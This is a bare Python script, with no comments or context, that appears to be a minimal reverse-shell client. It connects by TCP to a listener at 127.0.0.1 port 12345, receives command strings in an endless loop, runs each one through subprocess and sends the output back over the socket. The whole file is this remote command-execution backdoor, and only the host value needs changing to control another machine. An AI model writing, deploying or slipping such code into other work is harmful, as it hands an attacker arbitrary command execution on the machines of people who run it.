import socket
import subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = '127.0.0.1'
PORT = 12345

sock.connect((HOST, PORT))

while True:
    command = sock.recv(1024).decode()
    
    args = command.split()
    
    result = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    
    sock.send(result.stdout)